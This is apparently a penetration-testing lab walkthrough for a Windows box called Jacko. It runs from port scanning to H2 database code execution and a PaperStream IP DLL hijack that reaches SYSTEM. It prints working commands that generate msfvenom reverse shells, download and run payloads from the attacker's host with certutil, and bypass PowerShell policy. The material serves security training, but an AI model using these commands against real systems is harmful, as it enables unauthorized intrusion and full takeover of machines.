## Initial Foothold

Autorecon 192.168.160.66

```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc?        syn-ack ttl 125
139/tcp   open  netbios-ssn?  syn-ack ttl 125
445/tcp   open  microsoft-ds? syn-ack ttl 125
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
8082/tcp  open  http          syn-ack ttl 125 H2 database http console
9092/tcp  open  XmlIpcRegSvc? syn-ack ttl 125
49664/tcp open  unknown       syn-ack ttl 125
49665/tcp open  unknown       syn-ack ttl 125
49666/tcp open  unknown       syn-ack ttl 125
49667/tcp open  unknown       syn-ack ttl 125
49668/tcp open  unknown       syn-ack ttl 125
49669/tcp open  unknown       syn-ack ttl 125
```

port
- 139/445 (smb) - Can't enumerate anonymously. Enum4linux did not work
- 80 (web) - Running 1.4.199 H2 database but from searchsploit the exploit is complicated
- 8082 (web) - Login with default credentials. Maybe we can write a rev shell and go towards there file.

Saw this H2 Database 1.4.196 - Remote Code Execution
Even though the version is abit dated. Worth a shot. Did not work.
```
┌──(kali㉿kali)-[~/offsec/jacko]
└─$ python3 45506.py -H 192.168.160.66:8082
[*] Attempting to create database
[-] Unable to login

┌──(kali㉿kali)-[~/offsec/jacko]
└─$ python3 45506.py -H 192.168.160.66     
[*] Attempting to create database
[+] Created database and logged in
[*] Sending stage 1
[+] Shell succeeded - ^c or quit to exit
h2-shell$ ls
[-] Invalid command (list index out of range)
h2-shell$ exit
[-] Invalid command (list index out of range)
h2-shell$ quit
[+] Shutting down
```

Ok time to try the 1.4.199 exploit
```
-- Write native library
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90),CHAR(0x00),CHAR(0x03),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x04),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0xff),CHAR(0xff),CHAR(0x00),CHAR(0x00),CHAR(0xb8),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x40),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CH....', '', '', '', '', '');

-- Load native library
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

-- Evaluate script
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');

# We get a good response
jacko\tony
```

Next we cook up a shell on msfvenom and host it on port 80. Then we use the below certutil command to upload to our victim.
```
┌──(kali㉿kali)-[~/offsec/jacko]
└─$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o payload.exe LHOST=192.168.45.212 LPORT=7680
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe
```

Upload and catch a reverse shell on penelope.
```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.45.212/payload.exe C:/Users/Public/payload.exe").getInputStream()).useDelimiter("\\Z").next()');

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Users/Public/payload.exe").getInputStream()).useDelimiter("\\Z").next()');
```


## Privesc

Looking through Program files (x86) we can see a directory called PAPERSTREAM IP. Looking for exploits on exploit-db takes us to the following:

`https://www.exploit-db.com/exploits/49382`

Edit payload file to point at tony desktop. Create reverse shell with msfvenom. Host both on port 80.
```
$PayloadFile = "C:\users\tony\Desktop\UninOldIS.dll"

└─$ msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.45.212 LPORT=8082
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
Saved as: UninOldIS.dll
```


Set path if not certutil can't work. `certutil` to get them.
```
C:\Users\tony\Desktop>certutil -urlcache -split -f http://192.168.45.212/49382.ps1 exploit.ps1
certutil -urlcache -split -f http://192.168.45.212/49382.ps1 exploit.ps1
'certutil' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\tony\Desktop>echo %PATH%
echo %PATH%
C:\Users\tony\AppData\Local\Microsoft\WindowsApps;

C:\Users\tony\Desktop>set PATH=%SystemRoot%\system32;%SystemRoot%;
set PATH=%SystemRoot%\system32;%SystemRoot%;

C:\Users\tony\Desktop>echo %PATH%
echo %PATH%
C:\Windows\system32;C:\Windows;

C:\Users\tony\Desktop>certutil -urlcache -split -f http://192.168.45.212/49382.ps1 exploit.ps1
certutil -urlcache -split -f http://192.168.45.212/49382.ps1 exploit.ps1
CertUtil: -URLCache command completed successfully.

C:\Users\tony\Desktop>certutil -urlcache -split -f http://192.168.45.212/UninOldIS.dll UninOldIS.dll
certutil -urlcache -split -f http://192.168.45.212/UninOldIS.dll UninOldIS.dll
CertUtil: -URLCache command completed successfully.

C:\Users\tony\Desktop>dir
 Directory of C:\Users\tony\Desktop

11/23/2026  09:29 AM    <DIR>          .
11/23/2026  09:29 AM    <DIR>          ..
11/23/2026  09:29 AM             2,382 exploit.ps1
11/23/2026  09:10 AM                34 local.txt
04/22/2020  03:23 AM             1,450 Microsoft Edge.lnk
11/23/2026  09:29 AM             9,216 UninOldIS.dll
               4 File(s)         13,082 bytes
               2 Dir(s)   7,195,332,608 bytes free

```

launch PowerShell with its script execution policy set to **Bypass**. Then set up a penelope listening port on 8082 andrun exploit.ps1.
```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass

PS C:\Users\tony\Desktop> C:\users\tony\Desktop\exploit.ps1
C:\users\tony\Desktop\exploit.ps1
Writable location found, copying payload to C:\JavaTemp\
Payload copied, triggering...
```

Caught a shell
```
C:\Windows\system32>whoami
whoami
nt authority\system
```